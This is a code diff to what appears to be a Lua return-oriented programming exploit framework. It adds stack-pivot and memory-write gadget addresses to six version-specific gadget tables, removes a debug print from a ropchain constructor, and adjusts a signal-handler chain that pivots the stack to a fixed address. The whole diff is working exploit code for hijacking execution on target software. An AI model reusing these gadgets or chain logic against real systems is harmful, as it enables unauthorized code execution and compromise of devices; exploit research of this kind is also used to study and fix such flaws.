@@ -39,6 +39,8 @@ gadget_table = {
             ["pop rsi; ret"] = 0xd2810,
             ["pop r8; ret"] = 0xa01,
             ["mov r9, rbx; call [rax + 8]"] = 0x14a9a0,
+            ["mov esp, 0xfb0000bd; ret"] = 0x3963d4,
+            ["mov [rax + 8], rcx; ret"] = 0x135aea,
 
             ["mov [rdi], rsi; ret"] = 0xd0d7f,
             ["mov [rdi], rax; ret"] = 0x9522b,
@@ -143,6 +145,8 @@ gadget_table = {
             ["mov r9, rbx; call [rax + 8]"] = nil,
             ["pop r13 ; pop r14 ; pop r15 ; ret"] = 0x141fc7,
             ["mov r9, r13; call [rax + 8]"] = 0x136970,
+            ["mov esp, 0xfb0000bd; ret"] = 0x3798f4,
+            ["mov [rax + 8], rcx; ret"] = 0x1368da,
 
             ["mov [rdi], rsi; ret"] = 0xd326f,
             ["mov [rdi], rax; ret"] = 0x92c67,
@@ -194,6 +198,8 @@ gadget_table = {
             ["pop rsi; ret"] = 0xd2230,
             ["pop r8; ret"] = 0xa01,
             ["mov r9, rbx; call [rax + 8]"] = 0x14a3c0,
+            ["mov esp, 0xfb0000bd; ret"] = 0x394c54,
+            ["mov [rax + 8], rcx; ret"] = 0x13550a,
 
             ["mov [rdi], rsi; ret"] = 0xd079f,
             ["mov [rdi], rax; ret"] = 0x94c4b,
@@ -245,6 +251,8 @@ gadget_table = {
             ["pop rsi; ret"] = 0xfcd16,
             ["pop r8; ret"] = 0x961,
             ["mov r9, rbx; call [rax + 8]"] = 0x145f20,
+            ["mov esp, 0xfb0000bd; ret"] = 0x3925e4,
+            ["mov [rax + 8], rcx; ret"] = 0x12c5ff,
 
             ["mov [rdi], rsi; ret"] = 0xcbe0f,
             ["mov [rdi], rax; ret"] = 0xa16b,
@@ -296,6 +304,8 @@ gadget_table = {
             ["pop rsi; ret"] = 0xe4b04,
             ["pop r8; ret"] = 0x921,
             ["mov r9, rbx; call [rax + 8]"] = 0x14f760,
+            ["mov esp, 0xfb0000bd; ret"] = 0x3b8784,
+            ["mov [rax + 8], rcx; ret"] = 0x13b120,
 
             ["mov [rdi], rsi; ret"] = 0xd592f,
             ["mov [rdi], rax; ret"] = 0xa42b,
@@ -347,6 +357,8 @@ gadget_table = {
             ["pop rsi; ret"] = 0x10f122,
             ["pop r8; ret"] = 0x9f1,
             ["mov r9, rbx; call [rax + 8]"] = 0x1513ef,
+            ["mov esp, 0xfb0000bd; ret"] = 0x3bd134,
+            ["mov [rax + 8], rcx; ret"] = 0x13c6ea,
 
             ["mov [rdi], rsi; ret"] = 0xd78ef,
             ["mov [rdi], rax; ret"] = 0x996bb,
@@ -1372,7 +1384,6 @@ function ropchain:new(stack_size, padding, stack_base)
     self.stack_offset = 0
     self.stack_size = stack_size + padding
     self.stack_base = stack_base or bump.alloc(self.stack_size) + padding
-    print(self.stack_base)
     self.stack_backup = bump.alloc(self.stack_size) + padding
     
     self.jmpbuf_size = 0x50
@@ -2169,11 +2180,10 @@ function signal_handler()
 end
 
 function signal_handler_rop(client_fd)
-    local start_addr = 0xfb0000bd
-    output = string.rep("\0", 0x8)
+    output = bump.alloc(0x8)
     
     -- TODO: restore execution correctly instead of crash
-    local chain = ropchain(0x500, 0x100, start_addr - 0x8)
+    local chain = ropchain(0x500, 0x100, 0xfb0000bd - 0x8)
     
     chain:push_set_rdi(ropchain.resolve_value(client_fd))
     chain:push_set_rsi(ropchain.resolve_value(output))
